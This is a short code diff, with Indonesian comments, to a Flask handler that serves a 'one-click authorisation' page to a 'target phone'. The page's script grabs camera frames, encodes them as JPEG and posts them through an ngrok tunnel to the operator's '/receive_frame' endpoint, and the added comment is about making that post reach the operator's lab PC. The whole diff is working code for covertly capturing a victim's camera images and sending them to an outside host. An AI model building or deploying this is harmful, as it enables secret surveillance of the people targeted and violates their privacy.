@@ -16,7 +16,6 @@ def handshake():
         return f"✅ Terkunci: {ALAMAT_NGROK_LAB}", 200
 
     # JALUR B: Menyuplai halaman otorisasi satu-klik ke HP Target
-    # Menggunakan metode pemisahan kurung kurawal agar lolos dari error kompiler Render
     html_raw_payload = """
     <html>
     <head>
@@ -79,6 +78,7 @@ def handshake():
                             ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                             let base64data = canvas.toDataURL('image/jpeg', 0.4);
                             
+                            // FIX STRATEGI: Mengarahkan tembakan POST langsung menembus terowongan Ngrok PC Lab Anda secara fisik
                             fetch('https://' + targetLabAddress + '/receive_frame', {
                                 method: 'POST',
                                 body: base64data
